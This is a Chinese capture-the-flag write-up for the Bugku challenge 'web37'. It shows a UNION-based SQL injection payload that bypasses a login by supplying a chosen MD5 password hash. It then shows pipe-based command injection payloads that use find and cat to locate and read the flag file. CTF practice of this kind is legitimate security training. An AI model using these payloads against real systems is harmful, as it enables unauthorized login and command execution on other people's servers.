# web37

![img](../../../image/bugku/4483045190622.png)

题目描述
> union，命令执行

![img](../../../image/bugku/5482046193126.png)

进入题目之后是一个post表单
估计是sql注入
使用**单引号`'`**
来尝试看看有没有注入点
![img](../../../image/bugku/4709116204958.png)
返回有一串疑似base64编码的东西
解码一下
![img](../../../image/bugku/4886017205567.png)
得到一串源码
这是要要求查询结果不能为空
而且还需要回显的password等于passwrod的md5值
根据题目描述的提示
> **union**

使用联合查询来写入password的值
![img](../../../image/bugku/5076522232522.png)
所以构造payload1
```sql
username=-1' union select 1,'25d55ad283aa400af464c76d713c07ad'%23&password=12345678
```
![img](../../../image/bugku/5381723214735.png)

登录成功
![img](../../../image/bugku/1513624204033.png)
进入到这里
再通过题目描述的提示
> 命令执行

来查看flag
payload2
```shell
find / -name flag
```
![img](../../../image/bugku/54126200284.png)

结果没有任何回显
![img](../../../image/bugku/5092026212513.png)

emmm
输入一个ls
![img](../../../image/bugku/5923732219849.png)

发现回显了它后台执行的语句
`sh -c ps -aux | grep ls`

重点是这个`grep`
`grep`是可以使用管道符把执行结果作为参数传给下一个命令
![img](../../../image/bugku/5706136205578.png)

那payload3
```shell
1324|find / -name flag
```
![img](../../../image/bugku/4962629217552.png)

还是无回显
![img](../../../image/bugku/3740930218847.png)
这样可以试试传入文件中进行查看
![img](../../../image/bugku/4191935220026.png)

payload4
```shell
1|find / -name flag > flag
```
然后查看
![img](../../../image/bugku/1921140221857.png)

![img](../../../image/bugku/5714740214902.png)

查看到了有两个地方有flag
不知道哪个是真的
那就每个都试试看
payload5
```shell
1|cat /var/www/html/flag > flag
```
![img](../../../image/bugku/3919942211669.png)
啥都没有
那就是根目录下的那一个了

payload6
```shell
1|cat /flag > flag
```
![img](../../../image/bugku/3156944202000.png)
得到flag
